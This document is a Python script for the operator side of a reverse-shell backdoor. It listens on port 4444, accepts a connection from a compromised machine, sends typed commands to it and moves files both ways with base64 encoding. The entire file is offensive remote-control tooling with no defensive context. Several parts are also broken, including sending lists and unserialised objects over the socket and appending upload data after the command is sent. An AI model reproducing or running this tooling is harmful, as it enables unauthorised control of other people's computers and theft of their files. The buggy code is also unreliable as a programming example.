import socket
import subprocess
import json
import base64
class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # setting socket options(setsockopt)for regaining
        # the connection if network error occurs
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        # 0-indicates no limit for reverse connection
        listener.listen(5)
        print("listener started....!!")
        # accepts the connection
        self.connection, address = listener.accept()
        print("Got a connection from" + str(address))

    def box_send(self, data):
        # serialisation  or putting data inside json box
        json_data = json.dumps(data)
        # sending result to our pc
        self.connection.send(data)

    def box_receive(self):
        json_data=""
        while True:
            try:
                # storing the received box in a variable
                json_data = json_data+str(self.connection.recv(1024))
                # unwraaping the box
                return json.loads(json_data)
            except ValueError:
                continue

    def execute(self, command):
        self.box_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

       #return subprocess.check_output(command,shell=True)
        self.box_receive()

    # download function
    def write_file(self,file_name,content):
        with open(file_name,"wb")as file:
            file.write(base64.b64decode(content))
            return "download success"
    #upload function
    def read_file(self,file_name):
        with open(file_name,"rb")as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input("Enter a cmnd:")
            command=command.split(" ")
            response =self.connection.send(command)
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                if command[0]=="download":
                    response=self.write_file(command[1],response)
                 #self.connection.recv(1024)
            except Exception:
                response="[-]Error"
                print(response)


listerner_object=Listener("0.0.0.0",4444)
listerner_object.run()

